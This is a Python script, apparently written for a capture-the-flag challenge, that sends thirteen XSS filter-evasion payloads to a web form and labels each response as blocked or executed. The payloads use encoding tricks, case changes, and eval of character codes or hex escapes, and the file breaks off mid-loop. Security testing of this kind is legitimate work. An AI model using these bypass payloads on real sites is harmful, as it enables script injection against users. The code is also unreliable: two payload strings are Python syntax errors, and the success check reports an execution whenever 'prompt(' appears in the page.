import requests
import html
import urllib.parse

# Configuration
base_url = "http://ctf.madebynull.io:5000"
endpoint = "/page"
full_url = base_url + endpoint

# Test payloads with different encoding strategies
# Direct payload (from previous attempts)
payloads = [
    {
        "name": "Direct Prompt",
        "payload": "\";prompt('XSS');//",
        "encoding": "None"
    },
    {
        "name": "Direct Print",
        "payload": "\";print('XSS');//", 
        "encoding": "None"
    },
    {
        "name": "Fully URL Encoded Prompt",
        "payload": "%22%3Bprompt%28%27XSS%27%29%3B%2F%2F",
        "encoding": "URL"
    },
    {
        "name": "Fully URL Encoded Print",
        "payload": "%22%3Bprint%28%27XSS%27%29%3B%2F%2F",
        "encoding": "URL" 
    },
    {
        "name": "Partially Encoded - Function Only",
        "payload": '";' + urllib.parse.quote('prompt', safe='') + '(\'XSS\');//',
        "encoding": "Partial URL (function only)"
    },
    {
        "name": "Partially Encoded - Alert Only",
        "payload": '\";' + urllib.parse.quote('ale') + 'rt(\\'XSS\\');//',
        "encoding": "Partial URL (ale only)"
    },
    {
        "name": "HTML Entity - Full",
        "payload": html.escape('";alert(\'XSS\');//'),
        "encoding": "HTML Entities"
    },
    {
        "name": "Mixed Strategy 1",
        "payload": '";' + urllib.parse.quote('pr') + 'o' + urllib.parse.quote('mpt') + '(\'XSS\');//',
        "encoding": "Partial (pr+encoded+ompt)"
    },
    {
        "name": "Mixed Strategy 2",
        "payload": '";' + urllib.parse.quote('a', safe='') + 'le' + urllib.parse.quote('rt', safe='') + '(\'XSS\');//',
        "encoding": "Partial (a+le+rt encoded)"
    },
    {
        "name": "Case Variation - uppercase",
        "payload": '";' + 'PROMPT' + '(\'XSS\');//',
        "encoding": "Uppercase"
    },
    {
        "name": "Case Variation - mixed",
        "payload": '";' + 'PrOmPt' + '(\'XSS\');//', 
        "encoding": "Mixed case"
    },
    {
        "name": "Char Code - alert",
        "payload": '";eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));//',
        "encoding": "CharCode via eval"
    },
    {
        "name": "Hex Escaped - alert",  
        "payload": '";eval("\\\\x61\\\\x6C\\\\x65\\\\x72\\\\x74(\\'XSS\\')");//',
        "encoding": "Hex escape via eval"
    }
]

print("="*80)
print("XSS ENCODING BYPASS TESTING")
print(f"Target: POST {full_url}")
print("Parameter: name")
print("="*80)
print()

# Test each payload
results = []
for i, payload_test in enumerate(payloads, 1):
    payload = payload_test["payload"]
    
    print(f"--- Test {i}: {payload_test['name']} ---")
    print(f"Encoding: {payload_test['encoding']}")
    print(f"Payload raw: {repr(payload)}")
    print(f"Payload: {payload}")
    
    try:
        # Send POST request
        response = requests.post(
            full_url,
            data={"name": payload},
            timeout=10
        )
        
        print(f"Status Code: {response.status_code}")
        
        # Get HTML content
        html_content = response.text
        
        # Check if payload is reflected
        if payload in html_content:
            print("✓ Payload reflected literally (blocked)")
            exec_status = "Blocked - Literal Reflection"
        elif "&" in payload and "&amp;" in html_content and ",".join([str(ord(c)) for c in payload.split(";")[0]]) in str(html_content):
            print("✓ Payload reflected as HTML entities (blocked)")
            exec_status = "Blocked - HTML Entity Reflection"
        elif urllib.parse.unquote(payload) in html_content:
            print("✓ Payload URL decoded and reflected (blocked)")
            exec_status = "Blocked - URL Decoded Reflection"
        else:
            # Check if it's executed (JavaScript context)
            # Look for signs of successful injection
            if "prompt(" in html_content or "print(" in html_content or "eval(" in html_content:
                # Check if it's in script context vs escaped
                if "<script>" in html_content and payload in html_content:
                    print("✗ Injected but not executed (context issue)")
                    exec_status = "Injected - Not Executed"
                elif "alert(" in html_content or "prompt(" in html_content:
                    print("✓ XSS Executed (bypass successful)")
                    exec_status = "Success - XSS Executed"
                else:
                    print("? Unclear execution status")
                    exec_status = "Unknown"
            else:
                print("? Payload not found in response")
                exec_status = "Unknown - Not in Response"
        
        # Show snippet if payload is in response
        if payload in html_content or urllib.parse.unquote(payload) in html_content:
            try:
                idx = html_content.index(payload) if payload in html_content else html_content.index(urllib.parse.unquote(payload))
                snippet = html_content[max(0, idx-50):idx+len(payload)+50]
                print(f"Response snippet: ...{snippet}...")
            except:
                pass
        
        print()
        
        results.append({
            "test": i,
            "name": payload_test["name"],
            "encoding": payload_test["encoding"],
            "payload": payload,
            "status": exec_status,
            "response_length": len(html_content)
        })
        
    except Exception as e:
        print(f"Error: {e}")
        print()
        results.append({
            "test": i, 
            "name": payload_test["name"],
            "encoding": payload_test["encoding"],
            "payload": payload,
            "status": f"Error: {e}",
            "response_length": 0
        })

# Summary
print("="*80)
print("SUMMARY")
print("="*80)
print(f"\n{'Test':<4} {'Name':<25} {'Encoding':<25} {'Status':<30}")
print("-"*80)

for result in results:
    print(f"{result['test']:<4} {result['name']:<25} {result['encoding']:<25} {result['status']:<30}")

# Identify successful bypasses
successful = [r for r in results if "Success" in r['status']]
injected = [r for r in results if "Injected" in r['status']]

print(f"\n{'='*80}")
if successful:
    print(f"✓ SUCCESSFUL BYPASSES: {len(successful)}")
    for s in successful:
